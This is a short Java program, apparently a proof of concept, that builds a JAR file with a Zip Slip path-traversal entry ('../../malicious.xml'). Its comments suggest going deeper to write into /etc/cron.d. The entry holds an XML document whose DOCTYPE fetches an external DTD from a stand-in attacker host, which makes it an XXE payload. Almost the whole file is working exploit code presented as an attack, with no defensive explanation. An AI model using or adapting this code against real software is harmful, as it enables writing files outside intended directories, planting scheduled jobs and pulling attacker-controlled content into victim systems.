// Create a malicious JAR with a Zip Slip entry:
// Entry name: ../../malicious.xml
// This writes to: /tmp/<parent-of-temp-dir>/malicious.xml
// Or with deeper traversal: ../../../etc/cron.d/evil.xml
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.io.FileOutputStream;

public class CreateMaliciousJar {
    public static void main(String[] args) throws Exception {
        FileOutputStream fos = new FileOutputStream("malicious.jar");
        ZipOutputStream zos = new ZipOutputStream(fos);

        // Zip Slip entry - traverses out of temp directory
        ZipEntry entry = new ZipEntry("../../malicious.xml");
        zos.putNextEntry(entry);
        // Content that passes Parser.canParse() check (XML extension)
        String content = "<?xml version='1.0'?><!DOCTYPE suite SYSTEM 'http://attacker.com/evil.dtd'>";
        zos.write(content.getBytes());
        zos.closeEntry();
        zos.close();
    }
}
